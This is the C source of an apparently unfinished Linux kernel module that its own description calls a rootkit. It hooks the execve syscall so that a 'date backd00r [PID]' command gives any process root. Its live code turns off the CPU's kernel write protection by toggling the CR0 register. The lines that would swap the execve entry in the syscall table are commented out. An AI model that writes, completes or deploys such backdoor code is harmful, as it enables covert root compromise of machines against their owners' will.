#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yigit Colakoglu");
MODULE_DESCRIPTION("Hooks the execve syscall and matches 'date backd00r [PID]' to elevate PID to root");


// coming from: arch/x86/kernel/cpu/common.c
//   > void native_write_cr0(unsigned long val)
inline void mywrite_cr0(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val) : __FORCE_ORDER);
}

static void enable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  mywrite_cr0(cr0);
}

static void disable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  mywrite_cr0(cr0);
}


static int __init syscall_rootkit_init(void)
{
    // sys_call_table = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");
    // old_execve = sys_call_table[__NR_execve];
    disable_write_protection();
    // sys_call_table[__NR_execve] = my_execve;
    enable_write_protection();

    printk(KERN_INFO "All lights are green...\n");
    return 0;
}

static void __exit syscall_rootkit_exit(void)
{
    disable_write_protection();
    // sys_call_table[__NR_execve] = old_execve;
    enable_write_protection();
}

module_init(syscall_rootkit_init);
module_exit(syscall_rootkit_exit);
